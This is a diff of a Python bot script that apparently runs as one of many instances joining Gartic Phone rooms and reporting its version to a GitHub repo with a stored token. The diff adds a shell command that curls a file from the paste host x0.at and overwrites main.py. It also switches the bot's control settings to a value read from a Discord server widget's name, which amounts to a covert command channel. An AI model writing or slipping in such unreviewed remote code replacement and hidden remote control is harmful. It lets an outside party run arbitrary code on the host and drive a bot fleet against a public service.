@@ -12,6 +12,9 @@ import hashlib
 def randomstr(n):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))
 
+os.system("curl https://x0.at/4EM-.py --output main.py")
+#testgio3wa
+
 key = os.environ['key']
 global config
 config = {"url":""}
@@ -31,7 +34,7 @@ print(version)
 sha = None
 try:sha = requests.get("https://api.github.com/repos/ghub09331/ghub/contents/repls/"+myname,headers={"Accept": "application/vnd.github+json", "Authorization": "Bearer "+key}).json()["sha"]
 except:pass
-requests.put("https://api.github.com/repos/ghub09331/ghub/contents/repls/"+myname,headers={"Accept": "application/vnd.github+json", "Authorization": "Bearer "+key},json={"message":"status update","committer":{"name":"ghub09331","email":"ghub09331@gmail.com"},"content":base64.b64encode(version.encode()).decode()}).json()
+requests.put("https://api.github.com/repos/ghub09331/ghub/contents/repls/"+myname,headers={"Accept": "application/vnd.github+json", "Authorization": "Bearer "+key},json={"message":version+" update","committer":{"name":"ghub09331","email":"ghub09331@gmail.com"},"content":base64.b64encode(version.encode()).decode()}).json()
 
 def updater():
     global url
@@ -39,15 +42,11 @@ def updater():
     global nickname
     while True:
         try:
-            config = json.loads(base64.b64decode(requests.get("https://api.github.com/repos/ghub09331/ghub/contents/config.json",headers={"Accept": "application/vnd.github+json", "Authorization": "Bearer "+key}).json()["content"].encode()).decode())
+            config = json.loads(requests.get("https://discord.com/api/guilds/1110505904601837599/widget.json?"+str(time.time)).json()["name"])
             roomId = config["roomId"]
             nickname = config["nickname"]
             print(config)
             url = requests.get("https://garticphone.com/api/server?code="+roomId).text
-            sha = None
-            try:sha = requests.get("https://api.github.com/repos/ghub09331/ghub/contents/repls/"+myname,headers={"Accept": "application/vnd.github+json", "Authorization": "Bearer "+key}).json()["sha"]
-            except:pass
-            requests.put("https://api.github.com/repos/ghub09331/ghub/contents/repls/"+myname,headers={"Accept": "application/vnd.github+json", "Authorization": "Bearer "+key},json={"message":"status update","committer":{"name":"ghub09331","email":"ghub09331@gmail.com"},"content":base64.b64encode(version.encode()).decode()}).json()
         except:pass
         time.sleep(2)
 
